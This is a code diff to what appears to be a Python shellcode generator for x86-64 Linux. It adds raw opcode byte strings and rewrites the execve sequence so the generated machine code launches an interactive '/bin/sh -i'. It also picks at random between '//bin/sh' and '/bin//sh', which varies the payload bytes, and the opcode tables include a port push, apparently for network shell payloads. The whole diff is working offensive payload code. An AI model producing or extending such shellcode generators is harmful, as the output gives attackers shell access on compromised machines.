@@ -30,7 +30,8 @@ MOV = {
     "rsi,rbx": r"\x48\x89\xde",
     "rsi,rsp": r"\x48\x89\xe6",
     "rdi,rax": r"\x48\x89\xc7",
-    "r10,rax": r"\x49\x89\xc2"
+    "r10,rax": r"\x49\x89\xc2",
+    "rdx,rsp": r"\x48\x89\xe2"
 }
 
 XOR = {
@@ -49,10 +50,12 @@ INC = {
 PUSH = {
     "rax": r"\x50",
     "rbx": r"\x53",
+    "rdx": r"\x52",
     "rdi": r"\x57",
     "rsi": r"\x56",
     "port": r"\x66\x68",
-    "2": r"\x66\x6a\x02"
+    "2": r"\x66\x6a\x02",
+    "-i": r"\x66\x68\x2d\x69"
 }
 
 SUB = {
@@ -204,15 +207,28 @@ class Shellcode():
         self.clean("rax")
         self.clean("rdx")
 
+        # Gen random between '//bin/sh' and '/bin//sh'
         rd_index = randrange(2)
-
         self.__code += MOV["rbx"] + SHELL[rd_index]
+
+        # Filename
         self.__code += PUSH["rax"]
         self.__code += PUSH["rbx"]
         self.__code += MOV["rdi,rsp"]
+
+        # Argv
         self.__code += PUSH["rax"]
+        self.__code += PUSH["-i"]
+        self.__code += MOV["rdx,rsp"] # rdx: "-i"
+        self.__code += PUSH["rax"]
+        self.__code += PUSH["rdx"]
         self.__code += PUSH["rdi"]
-        self.__code += MOV["rsi,rsp"]
+        self.__code += MOV["rsi,rsp"] # rsi: ["-i"]
+
+        # Envp
+        self.clean("rdx")
+
+        # Execve
         self.__code += MOV["al"] + SYS_EXECVE
         self.__code += SYSCALL
 
